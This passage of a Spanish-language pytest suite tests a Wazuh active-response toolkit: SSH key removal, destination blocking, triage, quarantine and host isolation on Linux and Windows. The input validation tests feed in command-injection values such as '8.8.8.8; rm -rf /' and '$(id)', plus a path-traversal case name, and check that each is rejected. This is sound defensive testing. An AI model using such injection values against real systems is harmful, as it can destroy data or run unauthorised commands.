    r = ejecutar_ar(wazuh, "ssh-clave-restaurar", {"ejecucion_id": "ej-3", "ruta": str(claves)})
    assert r.acuses[-1]["estado"] == "fallida", "lo devuelto no se devuelve dos veces"


def test_ssh_clave_ambigua_se_rechaza(wazuh, tmp_path):
    claves = tmp_path / "authorized_keys"
    claves.write_text(f"ssh-ed25519 {CLAVE_SSH} atacante\n", encoding="utf-8")
    r = ejecutar_ar(wazuh, "ssh-clave", {"ejecucion_id": "ej-1", "ruta": str(claves), "clave": "ssh-ed25519 AAAA"})
    assert r.acuse["estado"] == "fallida" and "ambiguedad" in r.acuse["detalle"]
    assert CLAVE_SSH in claves.read_text(encoding="utf-8")


# === Bloqueo de destinos =====================================================

@pytest.mark.parametrize("destino", ["10.1.2.3", "192.168.1.10", "172.16.0.1", "127.0.0.1", "169.254.169.254", "::1", "fd00::1"])
def test_bloquear_destino_rechaza_ips_internas(wazuh, destino):
    r = ejecutar_ar(wazuh, "bloquear-destino", {"ejecucion_id": "ej-1", "destino": destino})
    assert r.acuse["estado"] == "fallida"
    assert "internas" in r.acuse["detalle"], r.acuse["detalle"]
    assert not (wazuh / "var" / "responselab" / "destinos.json").exists()


@pytest.mark.parametrize("destino", ["8.8.8.8; rm -rf /", "a" * 300, "", "$(id)"])
def test_bloquear_destino_rechaza_destinos_mal_formados(wazuh, destino):
    r = ejecutar_ar(wazuh, "bloquear-destino", {"ejecucion_id": "ej-1", "destino": destino})
    assert r.acuse["estado"] == "fallida" and "no valido" in r.acuse["detalle"]


@pytest.mark.parametrize("binarios,metodo", [("nft", "nftables"), ("iptables,ip6tables", "iptables")])
def test_bloquear_y_desbloquear_un_destino_publico(wazuh, binarios, metodo):
    env = {"RL_AR_BINARIOS": binarios}
    r = ejecutar_ar(wazuh, "bloquear-destino", {"ejecucion_id": "ej-1", "destino": "8.8.4.4"}, env=env)
    assert r.acuse["estado"] == "aplicada", r.acuse
    assert r.acuse["datos"] == {"ips": ["8.8.4.4"], "metodo": metodo}
    estado = json.loads((wazuh / "var" / "responselab" / "destinos.json").read_text(encoding="utf-8"))
    assert estado["8.8.4.4"]["ips"] == ["8.8.4.4"]

    r = ejecutar_ar(wazuh, "desbloquear-destino", {"ejecucion_id": "ej-2", "destino": "8.8.4.4"}, env=env)
    assert r.acuses[-1]["estado"] == "aplicada"
    assert json.loads((wazuh / "var" / "responselab" / "destinos.json").read_text(encoding="utf-8")) == {}
    r = ejecutar_ar(wazuh, "desbloquear-destino", {"ejecucion_id": "ej-3", "destino": "8.8.4.4"}, env=env)
    assert r.acuses[-1]["estado"] == "fallida" and "no consta" in r.acuses[-1]["detalle"]


# === Triage e instantanea de AD ==============================================

def test_triage_se_lanza_en_segundo_plano(wazuh, tmp_path):
    ftriage = tmp_path / "ftriage" / "triage.py"
    ftriage.parent.mkdir()
    ftriage.write_text("print('no se ejecuta en simulacion')\n", encoding="utf-8")
    (wazuh / "etc" / "responselab.conf").write_text(json.dumps({"ftriage": str(ftriage)}), encoding="utf-8")
    r = ejecutar_ar(wazuh, "triage", {"ejecucion_id": "ej-1", "caso": "C-1/../../x"})
    assert r.codigo == 0
    assert r.acuse["estado"] == "en_curso", r.acuse
    salida = Path(r.acuse["datos"]["salida"])
    assert salida.parent == wazuh / "var" / "responselab" / "triage"
    assert salida.name.startswith("C-1_.._.._x_"), "el caso no puede salirse de la carpeta de triage"


def test_triage_sin_ftriage_instalado(wazuh, tmp_path):
    (wazuh / "etc" / "responselab.conf").write_text(json.dumps({"ftriage": str(tmp_path / "no-esta.py")}), encoding="utf-8")
    r = ejecutar_ar(wazuh, "triage", {"ejecucion_id": "ej-1"})
    assert r.acuse["estado"] == "fallida" and "no esta instalado" in r.acuse["detalle"]


def test_instantanea_ad_no_se_hace_en_linux(wazuh):
    r = ejecutar_ar(wazuh, "instantanea-ad", {"ejecucion_id": "ej-1", "dn": "CN=x,DC=lab,DC=test"})
    assert r.acuse["estado"] == "fallida" and "Windows" in r.acuse["detalle"]


def test_resumen_ftriage_solo_lleva_lo_que_cabe_en_un_acuse(monkeypatch, wazuh):
    ar = cargar_modulo_ar(monkeypatch, wazuh)
    informe = {"host": {"hostname": "srv-01", "os": "x" * 1000}, "case": {"name": "C-1"},
               "assessment": {"verdict": "malicious", "risk_score": 90, "attack_techniques": [{"attack": "T1059", "tactic": "x"}] * 30},
               "iocs": [{"type": "ip", "value": "203.0.113.9", "defanged": "203[.]0[.]113[.]9"},
                        {"type": "ip", "value": "10.0.0.1", "private": True}],
               "findings": [{"level": "crit", "text": "t" * 500}, {"level": "info", "text": "x"}]}
    r = ar.resumen_ftriage(informe)
    assert r["host"] == {"hostname": "srv-01"}
    assert len(r["assessment"]["attack_techniques"]) == 20
    assert [i["value"] for i in r["iocs"]] == ["203.0.113.9"]
    assert len(r["findings"]) == 1 and len(r["findings"][0]["text"]) == 200


def test_acuse_recorta_los_datos_demasiado_grandes(monkeypatch, wazuh):
    ar = cargar_modulo_ar(monkeypatch, wazuh)
    cuerpo = ar.acuse("triage", "aplicada", "d" * 2000, "ej-1", {"clave%d" % i: "v" * 100 for i in range(100)})
    assert len(cuerpo["detalle"]) == 500
    assert json.loads(cuerpo["datos"])["recortado"] is True
    linea = (wazuh / "logs" / "active-responses.log").read_text(encoding="utf-8").strip()
    assert len(linea) < 8000


# === Windows: responselab_ar.ps1 y sus lanzadores .cmd =======================

def test_ps1_es_ascii():
    datos = SCRIPT_PS1.read_bytes()
    assert datos.isascii(), "PowerShell 5.1 lee un .ps1 sin BOM como ANSI: nada fuera de ASCII"


def test_hay_14_lanzadores_cmd_con_crlf_y_los_mismos_nombres_que_en_linux():
    assert len(LANZADORES_WINDOWS) == 14
    assert {n[:-len(".cmd")] for n in LANZADORES_WINDOWS} == set(LANZADORES_LINUX)
    contenidos = {(AR_WINDOWS / n).read_bytes() for n in LANZADORES_WINDOWS}
    assert len(contenidos) == 1
    datos = contenidos.pop()
    assert datos.isascii()
    assert b"\r\n" in datos and b"\n" not in datos.replace(b"\r\n", b""), "cmd.exe necesita CRLF en cada linea"
    texto = datos.decode("ascii")
    assert 'set "ACCION=%~n0"' in texto, "la accion sale del nombre del fichero"
    assert 'set "ACCION=%ACCION:responselab-=%"' in texto
    assert '-File "%~dp0responselab_ar.ps1" -Accion %ACCION%' in texto
    assert "Sysnative" in texto and "exit /b %ERRORLEVEL%" in texto


def test_ps1_tiene_las_mismas_acciones_que_linux():
    texto = SCRIPT_PS1.read_text(encoding="ascii")
    acciones = set(re.findall(r"'([a-z-]+)' = \$\{function:", texto))
    assert acciones == set(ACCIONES)


def _pwsh() -> Path:
    if PWSH is None:
        pytest.skip("PowerShell (pwsh) no esta instalado")
    return PWSH


def test_ps1_se_analiza_sin_errores():
    pwsh = _pwsh()
    orden = ("$t = $null; $e = $null; [void][System.Management.Automation.Language.Parser]::ParseFile("
             f"'{SCRIPT_PS1}', [ref]$t, [ref]$e); $e | ForEach-Object {{ $_.ToString() }}; exit $e.Count")
    p = subprocess.run([str(pwsh), "-NoLogo", "-NoProfile", "-NonInteractive", "-Command", orden],
                       capture_output=True, text=True, timeout=120, env=_entorno_base())
    assert p.returncode == 0, p.stdout + p.stderr


def ejecutar_ps1(tmp_path: Path, accion: str, parametros, respuesta: str | None = "continue",
                 comando: str = "add") -> tuple[subprocess.CompletedProcess, list[dict]]:
    pwsh = _pwsh()
    wazuh = tmp_path / "ossec-agent"
    estado = tmp_path / "ProgramData-ResponseLab"
    wazuh.mkdir(exist_ok=True)
    entrada = json.dumps(mensaje_execd(parametros, comando, accion + ".cmd")) + "\n"
    if respuesta is not None:
        entrada += json.dumps(respuesta_execd(respuesta)) + "\n"
    entorno = _entorno_base() | {"RL_WAZUH_DIR": str(wazuh), "RL_ESTADO_DIR": str(estado), "RL_AR_SIMULACION": "1"}
    p = subprocess.run([str(pwsh), "-NoLogo", "-NoProfile", "-NonInteractive", "-File", str(SCRIPT_PS1), "-Accion", accion],
                       input=entrada, capture_output=True, text=True, timeout=120, env=entorno)
    # En Windows el registro es active-response\active-responses.log; en Linux pwsh puede dejar la barra
    # invertida en el nombre: se busca cualquier fichero que acabe asi.
    acuses = []
    for f in sorted(wazuh.rglob("*")):
        if f.is_file() and f.name.endswith("active-responses.log"):
            acuses += leer_acuses(f)
    return p, acuses


def test_ps1_aislar_y_liberar_en_simulacion(tmp_path):
    """Aislar en simulacion no necesita cmdlets de Windows: registra las ordenes del cortafuegos."""
    (tmp_path / "ossec-agent").mkdir()
    (tmp_path / "ossec-agent" / "ossec.conf").write_text("<ossec_config><client><server><address>10.0.30.2</address>"
                                                         "</server></client></ossec_config>", encoding="ascii")
    p, acuses = ejecutar_ps1(tmp_path, "aislar", {"ejecucion_id": "ej-1", "permitidos": ["10.0.30.20"]})
    assert p.returncode == 0, p.stderr
    pedido = json.loads(p.stdout.strip().splitlines()[0])
    assert pedido["command"] == "check_keys" and pedido["origin"]["name"] == "responselab-aislar"
    assert pedido["parameters"]["keys"] == ["ej-1"]
    acuse = acuses[-1]
    assert acuse["estado"] == "aplicada", acuse
    assert acuse["datos"]["permitidos"] == ["10.0.30.2", "10.0.30.20"]
    ordenes = acuse["datos"]["ordenes"]
    assert any(o.startswith("Bloquear entrada salvo") for o in ordenes)
    assert any(o.startswith("Bloquear salida salvo") for o in ordenes)
    assert (tmp_path / "ProgramData-ResponseLab" / "aislamiento.json").is_file()

    p, acuses = ejecutar_ps1(tmp_path, "liberar", {"ejecucion_id": "ej-2"})
    assert p.returncode == 0, p.stderr
    assert acuses[-1]["estado"] == "aplicada"
    assert not (tmp_path / "ProgramData-ResponseLab" / "aislamiento.json").exists()


def test_ps1_rechaza_lo_que_debe_sin_tocar_nada(tmp_path):
    p, acuses = ejecutar_ps1(tmp_path, "matar", {"ejecucion_id": "ej-1", "pid": "4", "inicio": "2026-10-01T10:00:00Z"})
    assert p.returncode == 1
    assert acuses[-1]["estado"] == "fallida" and "protegido" in acuses[-1]["detalle"]

    p, acuses = ejecutar_ps1(tmp_path, "bloquear-destino", {"ejecucion_id": "ej-2", "destino": "192.168.1.10"})
    assert p.returncode == 1
    assert acuses[-1]["estado"] == "fallida" and "internas" in acuses[-1]["detalle"]


def test_ps1_abort_y_delete(tmp_path):
    p, acuses = ejecutar_ps1(tmp_path, "aislar", {"ejecucion_id": "ej-1", "permitidos": ["10.0.30.20"]}, respuesta="abort")
    assert p.returncode == 0
    assert [a["estado"] for a in acuses] == ["rechazada"]
    assert not (tmp_path / "ProgramData-ResponseLab" / "aislamiento.json").exists()

    p, acuses = ejecutar_ps1(tmp_path, "aislar", {"ejecucion_id": "ej-2"}, respuesta=None, comando="delete")
    assert p.returncode == 0 and p.stdout.strip() == ""
    assert [a["estado"] for a in acuses] == ["rechazada"], "un delete no deja acuse"


def test_ps1_cuarentena_y_restauracion_de_ida_y_vuelta(tmp_path):
    victima = tmp_path / "usuario" / "factura.exe"
    victima.parent.mkdir()
    victima.write_bytes(b"MZ contenido de prueba")
    sha = sha256_de(victima)
    p, acuses = ejecutar_ps1(tmp_path, "cuarentena", {"ejecucion_id": "ej-1", "ruta": str(victima), "sha256": sha})
    if p.returncode != 0 and "error inesperado" in (acuses[-1]["detalle"] if acuses else ""):
        pytest.skip(f"la cuarentena necesita cmdlets de Windows en este equipo: {acuses[-1]['detalle']}")
    assert p.returncode == 0, (p.stderr, acuses)
    assert acuses[-1]["estado"] == "aplicada"
    assert not victima.exists()
    carpetas = sorted((tmp_path / "ProgramData-ResponseLab" / "custodia").glob(sha + "-*"))
    assert len(carpetas) == 1, "una carpeta por fichero: hash del contenido y de la ruta"
    custodia = carpetas[0]
    assert (custodia / "fichero").read_bytes() == b"MZ contenido de prueba"

    p, acuses = ejecutar_ps1(tmp_path, "restaurar", {"ejecucion_id": "ej-2", "sha256": sha})
    assert p.returncode == 0, (p.stderr, acuses)
    assert acuses[-1]["estado"] == "aplicada"
    assert victima.read_bytes() == b"MZ contenido de prueba"
